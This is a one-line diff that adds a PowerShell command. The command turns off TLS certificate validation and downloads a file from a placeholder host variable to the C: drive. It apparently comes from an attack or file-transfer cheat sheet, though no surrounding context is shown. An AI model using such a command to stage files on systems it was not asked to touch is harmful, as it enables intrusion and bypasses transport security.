@@ -1,0 +1,1 @@
+powershell.exe -noprofile -noninteractive -command "[System.Net.ServicePointManager]::ServerCertificateValidationCallBack = {$true}; $source="""https://$ip/$file""";$destination="""C:\$downloaded""";$http = new-object System.Net.WebClient; $response = $http.DownloadFile($source, $destination);"
